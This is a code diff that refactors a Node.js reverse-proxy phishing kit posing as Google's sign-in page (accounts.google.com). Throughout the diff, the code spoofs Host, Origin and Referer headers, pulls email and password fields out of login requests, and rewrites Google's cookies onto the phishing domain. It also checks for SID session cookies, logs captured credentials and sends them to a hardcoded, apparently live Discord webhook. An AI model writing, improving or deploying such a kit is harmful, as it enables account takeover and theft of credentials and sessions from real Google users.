@@ -6,6 +6,11 @@ const rawBody = require('raw-body');
 
 const app = express();
 
+// --- CONFIGURATION ---
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1562347397328408668/77sTEQZglTHZUB-iP_oU1nkqftlqKVqpIKxkAirPQ5tNAPd-u-uSDNCapWpAAfgyBp7D';
+const TARGET_HOST = 'accounts.google.com';
+const TARGET_ORIGIN = `https://${TARGET_HOST}`;
+
 // --- GLOBAL ERROR HANDLERS ---
 process.on('uncaughtException', (err) => {
   console.error('Uncaught Exception:', err);
@@ -16,11 +21,6 @@ process.on('unhandledRejection', (reason, promise) => {
 
 // --- MIDDLEWARE ---
 app.use(cookieParser({ decode: (val) => val }));
-
-// --- CONFIGURATION ---
-// REPLACE THIS WITH YOUR ACTUAL DISCORD WEBHOOK URL
-const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1562347397328408668/77sTEQZglTHZUB-iP_oU1nkqftlqKVqpIKxkAirPQ5tNAPd-u-uSDNCapWpAAfgyBp7D';
-const TARGET_HOST = 'accounts.google.com';
 
 // --- DISCORD NOTIFIER ---
 async function sendToDiscord(title, fields, color = 0x00ff00) {
@@ -66,15 +66,62 @@ function rewriteCookies(cookies, localDomain) {
   });
 }
 
+// --- CREDENTIAL EXTRACTOR ---
+function extractCredentials(rawBodyStr) {
+  let email = null;
+  let password = null;
+
+  // 1. Try JSON
+  try {
+    const json = JSON.parse(rawBodyStr);
+    const searchJson = (obj) => {
+      if (typeof obj !== 'object' || obj === null) return;
+      for (const key in obj) {
+        const lowerKey = key.toLowerCase();
+        const value = obj[key];
+        if (typeof value === 'string') {
+          if (lowerKey.includes('email') || lowerKey.includes('identifier') || lowerKey.includes('phone')) {
+            email = value;
+          } else if (lowerKey.includes('pass') || lowerKey.includes('pwd') || lowerKey.includes('credential')) {
+            password = value;
+          }
+        } else if (typeof value === 'object') {
+          searchJson(value);
+        }
+      }
+    };
+    searchJson(json);
+  } catch (e) {
+    // 2. Try URL-encoded
+    try {
+      const params = new URLSearchParams(rawBodyStr);
+      for (const [key, value] of params.entries()) {
+        const lowerKey = key.toLowerCase();
+        if (lowerKey.includes('email') || lowerKey.includes('identifier') || lowerKey.includes('phone')) {
+          email = value;
+        } else if (lowerKey.includes('pass') || lowerKey.includes('pwd') || lowerKey.includes('credential')) {
+          password = value;
+        }
+      }
+    } catch (e2) {
+      console.log('[EXTRACT] Failed to parse body as JSON or URL-encoded.');
+    }
+  }
+
+  return { email, password };
+}
+
 // --- HEALTH CHECK ---
 app.get('/health', (req, res) => {
   console.log('[HEALTH] Health check received.');
   res.status(200).send('OK');
 });
 
-// --- RAW BODY CATCHER & ANALYZER ---
+// --- RAW BODY BUFFER ---
+// This middleware ensures req.rawBody is ALWAYS populated before the proxy runs.
 app.use((req, res, next) => {
   if (['GET', 'HEAD', 'DELETE'].includes(req.method)) {
+    req.rawBody = null;
     return next();
   }
 
@@ -88,46 +135,9 @@ app.use((req, res, next) => {
     
     console.log(`[RAW] ${req.method} ${req.originalUrl} - Body Length: ${rawBodyStr.length}`);
 
-    // --- CREDENTIAL EXTRACTION ---
-    // We use a "Fuzzy" search. We look for JSON keys or URL parameters that contain 'email' or 'pass'.
-    let email = null;
-    let password = null;
+    // Extract Credentials
+    const { email, password } = extractCredentials(rawBodyStr);
 
-    // 1. Try to parse as JSON first
-    try {
-      const json = JSON.parse(rawBodyStr);
-      // Recursively search the JSON object for keys
-      const searchJson = (obj) => {
-        if (typeof obj !== 'object' || obj === null) return;
-        for (const key in obj) {
-          const lowerKey = key.toLowerCase();
-          const value = obj[key];
-          if (typeof value === 'string') {
-            if (lowerKey.includes('email') || lowerKey.includes('identifier') || lowerKey.includes('phone')) {
-              email = value;
-            } else if (lowerKey.includes('pass') || lowerKey.includes('pwd') || lowerKey.includes('credential')) {
-              password = value;
-            }
-          } else if (typeof value === 'object') {
-            searchJson(value);
-          }
-        }
-      };
-      searchJson(json);
-    } catch (e) {
-      // Not JSON, try URL-encoded
-      const params = new URLSearchParams(rawBodyStr);
-      for (const [key, value] of params.entries()) {
-        const lowerKey = key.toLowerCase();
-        if (lowerKey.includes('email') || lowerKey.includes('identifier') || lowerKey.includes('phone')) {
-          email = value;
-        } else if (lowerKey.includes('pass') || lowerKey.includes('pwd') || lowerKey.includes('credential')) {
-          password = value;
-        }
-      }
-    }
-
-    // 2. If we found credentials, send them
     if (email && password) {
       console.log(`[CREDENTIALS] CAPTURED: ${email} : ${password}`);
       sendToDiscord('🔓 CREDENTIAL CAPTURE', [
@@ -144,7 +154,7 @@ app.use((req, res, next) => {
       ], 0x00aaff);
     }
 
-    // 3. Session Hijack Check
+    // Session Hijack Check
     if (req.headers.cookie) {
       const cookies = req.headers.cookie;
       const sidMatch = cookies.match(/SID=([^;]+)/);
@@ -165,41 +175,44 @@ app.use((req, res, next) => {
   });
 });
 
-// --- THE CATCH-ALL ROUTE (Pure HTTP Proxy) ---
+// --- THE PURE HTTP PROXY ---
+// This is the final catch-all. It handles ALL requests.
 app.all('*', (req, res) => {
-  // Determine the target URL
   const targetUrl = `${TARGET_HOST}${req.originalUrl}`;
   
-  // Prepare headers for the outgoing request
+  // Prepare headers
   const forwardHeaders = {
     ...req.headers,
-    'Host': TARGET_HOST, // Crucial: Must be accounts.google.com
-    'Origin': `https://${TARGET_HOST}`, // Crucial: Must match target
-    'Referer': `https://${TARGET_HOST}/signin/` // Crucial: Must look like a Google page
+    'Host': TARGET_HOST,
+    'Origin': TARGET_ORIGIN,
+    'Referer': `${TARGET_ORIGIN}/signin/`
   };
 
   // Remove hop-by-hop headers
   delete forwardHeaders['connection'];
   delete forwardHeaders['keep-alive'];
+  delete forwardHeaders['transfer-encoding'];
 
-  // If we have a raw body, use it. Otherwise, use undefined (for GET requests)
-  const body = req.rawBody ? req.rawBody : undefined;
+  // If we have a raw body, set Content-Length explicitly
+  if (req.rawBody) {
+    forwardHeaders['Content-Length'] = req.rawBody.length;
+  } else {
+    delete forwardHeaders['Content-Length'];
+  }
 
   console.log(`[PROXY] Forwarding ${req.method} to ${targetUrl}`);
 
   fetch(targetUrl, {
     method: req.method,
     headers: forwardHeaders,
-    body: body,
-    redirect: 'follow' // Follow redirects internally
+    body: req.rawBody || undefined,
+    redirect: 'follow'
   }).then(async (response) => {
-    // Read the response as a buffer
     const data = await response.arrayBuffer();
     
-    // Send the response back to the client
     res.status(response.status);
     
-    // Forward headers, excluding hop-by-hop and set-cookie
+    // Forward headers
     response.headers.forEach((value, key) => {
       const lowerKey = key.toLowerCase();
       if (lowerKey !== 'set-cookie' && lowerKey !== 'content-encoding' && lowerKey !== 'content-length' && lowerKey !== 'transfer-encoding' && lowerKey !== 'connection') {
@@ -210,12 +223,10 @@ app.all('*', (req, res) => {
     // Rewrite Cookies
     const setCookieHeaders = response.headers.getSetCookie ? response.headers.getSetCookie() : [response.headers.get('set-cookie')].filter(Boolean);
     if (setCookieHeaders && setCookieHeaders.length > 0) {
-      // Get the local domain from the request
       const localDomain = req.headers['host'].split(':')[0];
       res.setHeader('Set-Cookie', rewriteCookies(setCookieHeaders, localDomain));
     }
 
-    // Send the body
     res.send(Buffer.from(data));
   }).catch(err => {
     console.error(`[PROXY ERROR] ${err.message}`);
